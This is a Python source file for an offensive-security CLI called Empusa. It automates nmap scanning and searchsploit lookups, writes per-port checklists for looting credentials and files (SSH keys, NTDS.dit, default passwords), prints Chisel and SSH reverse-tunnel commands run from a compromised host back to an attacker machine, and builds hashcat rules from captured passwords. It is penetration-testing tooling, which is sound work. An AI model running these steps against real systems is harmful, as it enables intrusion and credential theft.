import os
import subprocess
import argparse
import re
import platform
import ipaddress
import shutil
from typing import List, Tuple, Optional, Set
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.text import Text
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from collections import Counter
from datetime import datetime

console = Console()

# Platform detection
IS_WINDOWS = platform.system() == "Windows"
IS_UNIX = platform.system() in ["Linux", "Darwin"]


def check_tool_exists(tool_name: str) -> bool:
    """Check if a command-line tool exists on PATH."""
    return shutil.which(tool_name) is not None


def validate_ip(ip: str) -> bool:
    """Validate if string is a valid IP address."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False


def sanitize_filename(name: str) -> str:
    """Remove characters that are invalid in filenames."""
    return re.sub(r'[<>:"/\\|?*]', '_', name)


def print_banner() -> None:
    """Display the Empusa banner."""
    banner = r"""
[bold red]
              ▄████████████▄
          ▄███▀▀        ▀▀███▄
        ▄██▀    ▄▄▄▄▄▄     ▀██▄
       ██▀    ▄█▀    ▀█▄     ▀██
      ██     ▄█        █▄     ██
     ██     ███  ▄▄▄▄  ███     ██
     ██     ███ ██████ ███     ██   [dim]“She shifts form... beauty, beast, and death.”[/dim]
     ██     ███  ▀▀▀▀  ███     ██
     ██     ▀█▄        ▄█▀     ██   [italic red]Empusa — Devourer of Men, Feeder on Fear[/italic red]
      ██▄     ▀█▄▄▄▄▄▄█▀     ▄██
       ▀██▄     ▀▀▀▀▀▀     ▄██▀
         ▀███▄▄        ▄▄▄██▀
             ▀▀████████▀▀
[/bold red]
[bold magenta]
███████╗   ███╗   ███╗   ██████╗   ██╗   ██╗   ███████╗    █████╗ 
██╔════╝   ████╗ ████║   ██╔══██╗  ██║   ██║   ██╔════╝   ██╔══██╗
█████╗     ██╔████╔██║   ██████╔╝  ██║   ██║   ███████╗   ███████║
██╔══╝     ██║╚██╔╝██║   ██╔═══╝   ██║   ██║   ╚════██║   ██╔══██║
███████╗   ██║ ╚═╝ ██║   ██║       ╚██████╔╝   ███████║   ██║  ██║
╚══════╝   ╚═╝     ╚═╝   ╚═╝        ╚═════╝    ╚══════╝   ╚═╝  ╚═╝
[/bold magenta]
[bold cyan]  Shape-shifting Recon & Exploitation Framework[/bold cyan]
[green]  Inspired by Empusa — vampire, demon, and sorceress of stealth[/green]
[yellow]  https://github.com/Icarus4122/empusa  |  v1.0.0[/yellow]
"""
    console.print(Panel.fit(banner, border_style="red"))

def detect_os(nmap_output: Path) -> str:
    """
    Detect OS from nmap output file.
    
    Args:
        nmap_output: Path to nmap output file
        
    Returns:
        "Windows", "Linux", or "Unknown"
    """
    nmap_path = Path(nmap_output)
    if not nmap_path.exists():
        console.print(f"[yellow]Warning: {nmap_output} not found for OS detection[/yellow]")
        return "Unknown"
    
    try:
        content = nmap_path.read_text(errors='ignore').lower()
        if "microsoft" in content or "windows" in content:
            return "Windows"
        elif any(x in content for x in ["linux", "unix", "ubuntu", "debian", "centos", "apache"]):
            return "Linux"
        else:
            return "Unknown"
    except Exception as e:
        console.print(f"[yellow]Warning: Could not read {nmap_output}: {e}[/yellow]")
        return "Unknown"

def search_exploits_from_nmap(nmap_file: Path) -> None:
    """
    Parse nmap results and search for exploits using searchsploit.
    
    Args:
        nmap_file: Path to nmap scan output
    """
    nmap_path = Path(nmap_file)
    if not nmap_path.exists():
        console.print(f"[red]Nmap file not found: {nmap_file}[/red]")
        return
    
    if not check_tool_exists("searchsploit"):
        console.print("[red]Error: searchsploit not found on PATH.[/red]")
        console.print("[yellow]Install exploit-db or skip this step.[/yellow]")
        return
    
    console.print(f"[cyan][*] Parsing services from {nmap_file} and searching exploits...[/cyan]")
    
    try:
        lines = nmap_path.read_text(errors='ignore').splitlines()
    except Exception as e:
        console.print(f"[red]Error reading file: {e}[/red]")
        return
    
    found_terms: Set[str] = set()
    # Fixed regex - removed double escaping in raw string
    service_regex = re.compile(r'(\d+)/(tcp|udp)\s+open\s+([\w\-]+)(\s+([\w\-\.]+))?')
    
    for line in lines:
        match = service_regex.search(line)
        if match:
            service = match.group(3)
            version = match.group(5) if match.group(5) else ""
            query = f"{service} {version}".strip()
            found_terms.add(query)

    exploit_log = nmap_path.parent / "searchsploit_results.md"
    
    try:
        with exploit_log.open("w") as out:
            out.write(f"# Exploit Search Results\n")
            out.write(f"Generated: {datetime.now().isoformat()}\n\n")
            
            for term in sorted(found_terms):
                console.print(f"\n[bold yellow]>> searchsploit {term}[/bold yellow]")
                out.write(f"## Exploits for: {term}\n")
                try:
                    result = subprocess.run(
                        ["searchsploit", term], 
                        capture_output=True, 
                        text=True, 
                        check=False,
                        timeout=30
                    )
                    console.print(result.stdout)
                    out.write(f"```\n{result.stdout}\n```\n\n")
                except subprocess.TimeoutExpired:
                    msg = "searchsploit timed out\n"
                    console.print(f"[yellow]{msg}[/yellow]")
                    out.write(msg + "\n")
                except Exception as e:
                    msg = f"Error running searchsploit: {e}\n"
                    console.print(f"[yellow]{msg}[/yellow]")
                    out.write(msg + "\n")

        console.print(f"[green][+] Saved exploit suggestions to: {exploit_log}[/green]")
    except Exception as e:
        console.print(f"[red]Error writing exploit log: {e}[/red]")

def run_nmap(ip: str, output_path: Path) -> Tuple[str, Path]:
    """
    Run nmap scan against target IP.
    
    Args:
        ip: Target IP address
        output_path: Directory to save results
        
    Returns:
        Tuple of (ip, output_file_path)
    """
    output_path = Path(output_path)
    output_path.mkdir(parents=True, exist_ok=True)
    output_file = output_path / "full_scan.txt"
    greppable = output_path / "ports_grep.txt"

    if not check_tool_exists("nmap"):
        console.print("[red]Error: nmap not found on PATH.[/red]")
        console.print("[yellow]Install nmap before running scans.[/yellow]")
        return ip, output_file

    def _run_nmap(cmd: List[str]) -> subprocess.CompletedProcess:
        """Run nmap command with error handling."""
        try:
            return subprocess.run(
                cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                timeout=600  # 10 minute timeout
            )
        except subprocess.TimeoutExpired:
            console.print(f"[yellow]Warning: Nmap scan timed out for {ip}[/yellow]")
            return subprocess.CompletedProcess(cmd, 1, b"", b"Timeout")
        except Exception as e:
            console.print(f"[red]Error running nmap: {e}[/red]")
            return subprocess.CompletedProcess(cmd, 1, b"", str(e).encode())

    def _parse_greppable(path: Path) -> List[str]:
        """Parse greppable nmap output for open ports."""
        ports: Set[str] = set()
        rx = re.compile(r'(\d+)/open/(?:tcp|udp)', re.IGNORECASE)
        
        if not path.exists():
            return []
        
        try:
            for line in path.read_text(errors="ignore").splitlines():
                if "Ports:" not in line:
                    continue
                for m in rx.finditer(line):
                    ports.add(m.group(1))
        except Exception as e:
            console.print(f"[yellow]Warning: Could not parse {path}: {e}[/yellow]")
        
        return sorted(ports, key=int)

    console.print(f"[*] Scanning (fast discovery) on [bold yellow]{ip}[/]...", style="cyan")

    disc_cmd = [
            "nmap", "-n", "-T4", "-Pn", "-A",
            ip, "-oG", str(greppable)
        ]
    _run_nmap(disc_cmd)
    open_ports = _parse_greppable(greppable)

    if not open_ports:
        console.print("[yellow]No ports found, retrying discovery with higher retries…[/yellow]")
        disc_cmd_retry = [
            "nmap", "-n", "-T5", "-Pn", "-p-",
            "--max-rtt-timeout", "1000ms",
            "-sS",
            ip, "-oG", str(greppable)
        ]
        _run_nmap(disc_cmd_retry)
        open_ports = _parse_greppable(greppable)

    if not open_ports:
        console.print("[red]Discovery still empty. Falling back to -A (full) so you get results.[/red]")
        _run_nmap(["nmap", "-A", "-T5", "-Pn", "-p-", ip, "-oN", str(output_file)])
    else:
        ports_csv = ",".join(open_ports)
        console.print(f"[*] Enriching {ip} (ports: {ports_csv})...", style="cyan")
        enrich_cmd = [
            "nmap", "-n", "-T4", "-Pn",
            "-sV", "--version-light",
            "--script-timeout", "5s",
            "-p", ports_csv,
            ip, "-oN", str(output_file)
        ]
        _run_nmap(enrich_cmd)

    ports_dir = output_path / "ports"
    ports_dir.mkdir(exist_ok=True)
    environment = output_path.parent.parent.name

    nmap_line = re.compile(r'(\d+)/(tcp|udp)\s+open\s+([\w\-\._]+)(\s+(.*))?')
    
    if not output_file.exists():
        console.print(f"[yellow]Warning: {output_file} not created[/yellow]")
        return ip, output_file
    
    try:
        lines = output_file.read_text(errors='ignore').splitlines()
    except Exception as e:
        console.print(f"[yellow]Warning: Could not read {output_file}: {e}[/yellow]")
        return ip, output_file
        
    for line in lines:
        match = nmap_line.search(line)
        if not match:
            continue
        port = match.group(1)
        proto = match.group(2)
        service = sanitize_filename(match.group(3).lower())
        version_info = match.group(5) if match.group(5) else ""

        filename = f"{port}-{service}.txt"
        port_file_path = ports_dir / filename

        try:
            with port_file_path.open('w') as pf:
                pf.write(f"# Environment: {environment}\n")
                pf.write(f"# Host: {ip}\n")
                pf.write(f"# Port: {port}/{proto}\n")
                pf.write(f"# Service: {service}\n")
                if version_info:
                    pf.write(f"# Version: {version_info}\n")
                pf.write(f"# Timestamp: {datetime.now().isoformat()}\n\n")
                pf.write(line.strip() + "\n")
                pf.write("\n# === Suggested Next Steps ===\n")
                if service in ["http", "https"]:
                    pf.write("# - Run dirsearch or gobuster for content discovery\n")
                    pf.write("# - Scan with Nikto, Nuclei, or Wapiti for vulnerabilities\n")
                    pf.write("# - Loot: robots.txt, config files, login panels, backups\n")
                    pf.write("# - Try default creds or admin/admin on CMS\n")
                elif service == "ssh":
                    pf.write("# - Check for weak/default SSH credentials\n")
                    pf.write("# - Loot: ~/.ssh/id_rsa, authorized_keys, bash_history\n")
                    pf.write("# - Post-exploitation: SSH pivot or key reuse\n")
                elif service in ["smb", "microsoft-ds", "microsoft_ds"]:
                    pf.write("# - Enum with smbmap, enum4linux-ng, CrackMapExec\n")
                    pf.write("# - Loot: shares, SAM/NTDS.dit, SYSVOL, GPP passwords\n")
                    pf.write("# - Check for null sessions and guest access\n")
                elif service == "ftp":
                    pf.write("# - Check for anonymous login\n")
                    pf.write("# - Loot: upload directories, backup archives, creds.txt\n")
                    pf.write("# - Post-exploitation: file upload for persistence\n")
                elif service == "rdp":
                    pf.write("# - Confirm NLA status and CredSSP vulnerabilities\n")
                    pf.write("# - Brute force with Hydra or Crowbar (if permitted)\n")
                    pf.write("# - Loot: screenshots, clipboard access, session hijack\n")
                elif service == "mysql":
                    pf.write("# - Attempt login with root/root or no password\n")
                    pf.write("# - Loot: mysql.user table, sensitive schema dumps\n")
                    pf.write("# - Post-exploitation: data exfil or local file read\n")
                elif service == "telnet":
                    pf.write("# - WARNING: Telnet is plaintext and sniffable\n")
                    pf.write("# - Try common creds: admin:admin, root:root\n")
                    pf.write("# - Loot: configs, debug menus, motd banners\n")
                elif service == "winrm":
                    pf.write("# - Test with evil-winrm or CrackMapExec\n")
                    pf.write("# - Loot: PowerShell history, execution context\n")
                    pf.write("# - Post-exploitation: PS credential injection\n")
                elif service == "ldap":
                    pf.write("# - Use ldapsearch or nmap --script=ldap* for info leak\n")
                    pf.write("# - Loot: usernames, OU structure, domain policies\n")
                    pf.write("# - Check for anonymous binds or ASREPRoastable users\n")
                else:
                    pf.write("# - Investigate service manually or with nmap scripts\n")
                    pf.write("# - Loot: banners, misconfigurations, leaks\n")
                pf.write("# ============================\n")
        except Exception as e:
            console.print(f"[yellow]Warning: Could not write port file {port_file_path}: {e}[/yellow]")

    return ip, output_file

def summarize_hosts(env_name: str) -> None:
    """
    Summarize scan results for all hosts in an environment.
    
    Args:
        env_name: Name of the environment directory
    """
    base_dir = Path(env_name).absolute()
    if not base_dir.exists():
        console.print(f"[bold red]Environment folder '{env_name}' does not exist.[/bold red]")
        return

    output_lines = []
    try:
        for entry in base_dir.iterdir():
            if entry.is_dir() and "-" in entry.name:
                nmap_file = entry / "nmap" / "full_scan.txt"
                if nmap_file.exists():
                    try:
                        ports = []
                        for line in nmap_file.read_text(errors='ignore').splitlines():
                            if "/tcp" in line and "open" in line:
                                parts = line.split()
                                if len(parts) >= 3:
                                    ports.append(f"{parts[0]}/{parts[2]}")
                        ports_display = ", ".join(ports) if ports else "No open ports"
                        output_lines.append(f"{entry.name}: {ports_display}")
                    except Exception as e:
                        console.print(f"[yellow]Warning: Could not read {nmap_file}: {e}[/yellow]")
    except Exception as e:
        console.print(f"[red]Error listing environment: {e}[/red]")

    if output_lines:
        console.print("[bold blue]== Host Summary ==[/bold blue]", highlight=False)
        console.print("```", highlight=False)
        for line in output_lines:
            console.print(line, highlight=False)
        console.print("```", highlight=False)
    else:
        console.print("[bold yellow]No scan results found to summarize.[/bold yellow]")

def configure_shell_history(hist_file: Path) -> None:
    """
    Configure shell history logging for cross-platform support.
    
    Args:
        hist_file: Path to the history file
    """
    hist_file = Path(hist_file).absolute()
    
    if IS_WINDOWS:
        # Windows PowerShell configuration
        profile_path = Path(os.environ.get("USERPROFILE", "")) / "Documents" / "WindowsPowerShell" / "Microsoft.PowerShell_profile.ps1"
        profile_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Check if already configured
        if profile_path.exists():
            content = profile_path.read_text(errors='ignore')
            if str(hist_file) in content:
                console.print(f"[yellow]PowerShell profile already configured for {hist_file}[/yellow]")
                return
        
        config = f'''
# Empusa Command Logging
$EmpusaHistoryFile = "{hist_file}"
Register-EngineEvent PowerShell.Exiting -Action {{
    Get-History | Export-Csv -Path $EmpusaHistoryFile -Append -NoTypeInformation
}}
'''
        try:
            with profile_path.open("a", encoding='utf-8') as f:
                f.write(config)
            console.print(f"[green][+] PowerShell profile configured: {profile_path}[/green]")
            console.print("[yellow]Restart PowerShell or run: . $PROFILE[/yellow]")
        except Exception as e:
            console.print(f"[red]Error configuring PowerShell profile: {e}[/red]")
            console.print("[yellow]You can manually log commands to the file.[/yellow]")
    
    elif IS_UNIX:
        # Unix shell configuration
        shell = os.environ.get("SHELL", "/bin/bash")
        if "bash" in shell:
            rc_file = Path.home() / ".bashrc"
            config = f'''
# Empusa Command Logging
export HISTFILE="{hist_file}"
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTTIMEFORMAT="%F %T "
shopt -s histappend
PROMPT_COMMAND="history -a; ${{PROMPT_COMMAND}}"
'''
        elif "zsh" in shell:
            rc_file = Path.home() / ".zshrc"
            config = f'''
# Empusa Command Logging
export HISTFILE="{hist_file}"
export HISTSIZE=10000
export SAVEHIST=20000
export HISTTIMEFORMAT="%F %T "
setopt EXTENDED_HISTORY
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
'''
        else:
            console.print(f"[yellow]Unsupported shell: {shell}. Command logging may not work.[/yellow]")
            return
        
        # Check if already configured
        if rc_file.exists():
            content = rc_file.read_text(errors='ignore')
            if str(hist_file) in content:
                console.print(f"[yellow]Shell RC file already configured for {hist_file}[/yellow]")
                return
        
        try:
            with rc_file.open("a") as f:
                f.write(config)
            console.print(f"[green][+] Shell logging hook written to {rc_file}[/green]")
            console.print(f"[yellow]Please run: source {rc_file}[/yellow]")
        except Exception as e:
            console.print(f"[red]Error configuring shell: {e}[/red]")
    else:
        console.print("[yellow]Unknown platform. Command logging not configured.[/yellow]")

def build_env(env_name: str, ips: List[str]) -> None:
    """
    Build penetration testing environment with scanning and file structure.
    
    Args:
        env_name: Name of the environment
        ips: List of IP addresses to scan
    """
    # Validate IPs
    valid_ips = []
    for ip in ips:
        if validate_ip(ip):
            valid_ips.append(ip)
        else:
            console.print(f"[red]Invalid IP address: {ip} - skipping[/red]")
    
    if not valid_ips:
        console.print("[red]No valid IP addresses provided. Aborting.[/red]")
        return
    
    if not check_tool_exists("nmap"):
        console.print("[red]Error: nmap not found. Please install nmap first.[/red]")
        return
    
    base_dir = Path(env_name).absolute()
    
    # Check if environment already exists
    if base_dir.exists() and any(base_dir.iterdir()):
        if not Confirm.ask(f"[yellow]Environment '{env_name}' already exists. Continue?[/yellow]"):
            return
    
    base_dir.mkdir(parents=True, exist_ok=True)

    users_file = base_dir / f"{env_name}-users.txt"
    passwords_file = base_dir / f"{env_name}-passwords.txt"
    commands_log_file = base_dir / "commands_ran.txt"

    # Create files
    users_file.touch()
    passwords_file.touch()
    commands_log_file.touch()

    # Configure shell history
    configure_shell_history(commands_log_file)

    ip_dirs = {}

    for ip in valid_ips:
        temp_path = base_dir / ip
        nmap_path = temp_path / "nmap"
        nmap_path.mkdir(parents=True, exist_ok=True)
        ip_dirs[ip] = nmap_path

    console.print("[bold green]\n[*] Starting threaded Nmap scanning...[/bold green]")
    scan_results = {}
    max_workers = min(8, len(valid_ips))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_ip = {executor.submit(run_nmap, ip, nmap_path): ip for ip, nmap_path in ip_dirs.items()}
        for future in as_completed(future_to_ip):
            ip, scan_output = future.result()
            scan_results[ip] = scan_output

    for ip, scan_output in scan_results.items():
        os_type = detect_os(scan_output)
        old_path = base_dir / ip
        new_path = base_dir / f"{ip}-{os_type}"

        if new_path.exists():
            console.print(f"[!] Warning: {new_path} already exists. Skipping rename.", style="bold red")
        else:
            try:
                old_path.rename(new_path)
                console.print(f"[+] {ip} classified as {os_type} -> {new_path}", style="green")
            except Exception as e:
                console.print(f"[red]Error renaming {old_path}: {e}[/red]")

    try:
        with commands_log_file.open("a") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Built environment '{env_name}' with IPs: {', '.join(valid_ips)}\n")
    except Exception as e:
        console.print(f"[yellow]Warning: Could not write to command log: {e}[/yellow]")

def build_reverse_tunnel() -> None:
    """Interactive builder for reverse tunnel setup (Chisel or SSH)."""
    console.print("\n[bold cyan]== Reverse Tunnel Builder ==[/]")
    console.print("[bold]Choose Tunnel Type:[/]")
    console.print("1. Chisel")
    console.print("2. SSH")
    console.print("0. Back to Main Menu")

    choice = Prompt.ask("Select an option")

    if choice == '1':
        attacker_ip = Prompt.ask("Enter your public IP (Chisel server)")
        chisel_port = Prompt.ask("Enter port for Chisel listener on your machine")
        socks_port = Prompt.ask("Enter SOCKS proxy port to open (on your machine)")

        console.print(f"""
[bold green]--- Chisel Setup ---[/bold green]
[bold]On your attacking machine, run:[/bold]
  ./chisel server -p {chisel_port} --socks5 --reverse

[bold]On the target (compromised) machine, run:[/bold]
  ./chisel client {attacker_ip}:{chisel_port} R:{socks_port}:socks
""")

    elif choice == '2':
        attacker_user = Prompt.ask("Enter your username on attacker machine")
        attacker_host = Prompt.ask("Enter your public IP or hostname")
        remote_port = Prompt.ask("Enter remote port to open on attacker machine")
        local_port = Prompt.ask("Enter local port to expose (on target machine)")

        console.print(f"""
[bold green]--- SSH Tunnel Setup ---[/bold green]
[bold]On the target (compromised) machine, run:[/bold]
  ssh -R {remote_port}:127.0.0.1:{local_port} {attacker_user}@{attacker_host}
""")

    elif choice == '0':
        return
    else:
        console.print("[bold red]Invalid choice. Returning to main menu.[/bold red]")

def find_password_files(domain: str, search_path: Path = None) -> List[Path]:
    """
    Search for password files matching the domain name.
    
    Args:
        domain: Domain/environment name to search for
        search_path: Root path to search from (defaults to current directory)
        
    Returns:
        List of matching password file paths
    """
    if search_path is None:
        search_path = Path.cwd()
    
    target_filename = f"{domain}-passwords.txt"
    matches = []
    
    console.print(f"[cyan]Searching for {target_filename} in {search_path}...[/cyan]")
    
    try:
        for path in search_path.rglob(target_filename):
            if path.is_file():
                matches.append(path)
                console.print(f"[green]Found: {path}[/green]")
    except Exception as e:
        console.print(f"[yellow]Warning during search: {e}[/yellow]")
    
    return matches


def generate_hashcat_rules() -> None:
    """Generate hashcat rules from password patterns in environment password file."""
    console.print("[bold cyan]\n== Hashcat Rule Generator ==[/bold cyan]")

    domain = Prompt.ask("Enter domain/environment name (used in filename)").strip().rstrip('/')
    
    # Search in current directory and subdirectories
    matches = find_password_files(domain)
    
    # If not found locally, ask for custom search path
    if not matches:
        console.print(f"[yellow]No {domain}-passwords.txt found in current directory.[/yellow]")
        if Confirm.ask("Search in a different directory?"):
            custom_path = Prompt.ask("Enter directory path to search")
            try:
                matches = find_password_files(domain, Path(custom_path))
            except Exception as e:
                console.print(f"[red]Error searching custom path: {e}[/red]")
                return
    
    if not matches:
        console.print(f"[bold red]No {domain}-passwords.txt file found.[/bold red]")
        return

    if len(matches) == 1:
        pw_file = matches[0]
    else:
        console.print("[bold yellow]Multiple password files found:[/bold yellow]")
        for i, path in enumerate(matches):
            console.print(f"{i + 1}. {path}")
        try:
            index = int(Prompt.ask("Select the file to use", choices=[str(i + 1) for i in range(len(matches))])) - 1
            pw_file = matches[index]
        except (ValueError, IndexError):
            console.print("[red]Invalid selection.[/red]")
            return

    pw_file = Path(pw_file)
    rule_file = pw_file.parent / "hashcat_generated.rule"

    try:
        passwords = [line.strip() for line in pw_file.read_text(errors='ignore').splitlines() if line.strip()]
    except Exception as e:
        console.print(f"[red]Error reading password file: {e}[/red]")
        return

    rule_counter = Counter()

    for pw in passwords:
        pw_rules = set()

        # Case patterns
        if pw.islower(): pw_rules.add("l")
        if pw.isupper(): pw_rules.add("u")
        if pw.istitle(): pw_rules.add("c")
        if re.search(r"[A-Z][a-z]+[A-Z]", pw): pw_rules.add("c")

        # Reverse detection
        if pw[::-1] in passwords: pw_rules.add("r")

        # Digit patterns
        if any(char.isdigit() for char in pw): pw_rules.add("$1")
        if pw[-1:].isdigit(): pw_rules.add("$" + pw[-1])
        if pw[-3:].isdigit(): pw_rules.add("$" + pw[-3:])
        if pw.istitle() and pw[-1:].isdigit(): pw_rules.add("c$1")

        # Symbol endings
        if pw[-1:] in "!@#$%^&*()": pw_rules.add("$" + pw[-1])

        # Year pattern detection (1900–2029)
        if re.search(r"(19|20)[0-9]{2}", pw): pw_rules.add("$2023")

        # Repeated characters
        if re.search(r"(.)\1{2,}", pw): pw_rules.add("d")

        # Keyboard walk patterns
        if any(x in pw.lower() for x in ["qwe", "asd", "zxc", "123", "789"]): pw_rules.add("d")

        # Common leetspeak
        if "@" in pw or "4" in pw: pw_rules.add("sa@")
        if "3" in pw: pw_rules.add("se3")
        if "1" in pw or "!" in pw: pw_rules.add("sl1")
        if "0" in pw: pw_rules.add("so0")
        if "5" in pw: pw_rules.add("ss5")
        if "7" in pw: pw_rules.add("st7")

        # Prefix/suffix common admin words
        common_words = ["admin", "test", "guest", "temp", "root"]
        if any(pw.lower().startswith(w) for w in common_words): pw_rules.add("^A")
        if any(pw.lower().endswith(w) for w in common_words): pw_rules.add("$A")

        # Phone number / ZIP code detection
        if pw.isdigit() and len(pw) in (5, 10): pw_rules.add("$zip")

        if pw_rules:
            rule_combo = ''.join(sorted(pw_rules))
            rule_counter[rule_combo] += 1
    
    most_common_rules = [rule for rule, _ in rule_counter.most_common(10)]

    try:
        with rule_file.open('w') as rf:
            for rule in most_common_rules:
                rf.write(rule + "\n")
        console.print(f"[green][+] {len(most_common_rules)} rules generated from {len(passwords)} passwords[/green]")
        console.print(f"[bold green]Saved rules to:[/] {rule_file}")
    except Exception as e:
        console.print(f"[red]Error writing rule file: {e}[/red]")


def summarize_command() -> None:
    """Display the main menu options."""
    console.print("[bold blue]==== Environment Automation Tool ====[/bold blue]")
    console.print("1. Build New Environment")
    console.print("2. Build Reverse Tunnel")
    console.print("3. Generate Hashcat Rules")
    console.print("4. Search Exploits from Nmap Results")
    console.print("0. Exit")


def main_menu() -> None:
    """Run the interactive main menu loop."""
    print_banner()
    while True:
        summarize_hosts(".")
        console.print("")
        summarize_command()
        choice = Prompt.ask("Select an option")

        if choice == '1':
            env_name = Prompt.ask("Enter environment name")
            ip_input = Prompt.ask("Enter IPs (comma-separated)")
            ips = [ip.strip() for ip in ip_input.split(',') if ip.strip()]
            build_env(env_name, ips)
        elif choice == '2':
            build_reverse_tunnel()
        elif choice == '3':
            generate_hashcat_rules()
        elif choice == '4':
            env_name = Prompt.ask("Enter environment name")
            ip_target = Prompt.ask("Enter target IP or folder format (e.g., 10.10.10.10-Windows)")
            nmap_path = Path(env_name) / ip_target / "nmap" / "full_scan.txt"
            search_exploits_from_nmap(nmap_path)
        elif choice == '0':
            console.print("Exiting.", style="bold yellow")
            break
        else:
            console.print("[bold red]Invalid choice. Try again.[/bold red]")


def main() -> None:
    """Main entry point for the Empusa CLI."""
    from empusa import __version__
    
    parser = argparse.ArgumentParser(
        prog="empusa", 
        description="Empusa – Shape-shifting Recon & Exploitation Automation Framework",
        epilog="Use responsibly and only with explicit authorization."
    )
    parser.add_argument(
        "--version", 
        action="version", 
        version=f"%(prog)s {__version__}"
    )
    parser.add_argument(
        "--menu", 
        action="store_true", 
        help="Launch interactive menu (default)"
    )
    args = parser.parse_args()
    main_menu()

if __name__ == '__main__':
    main()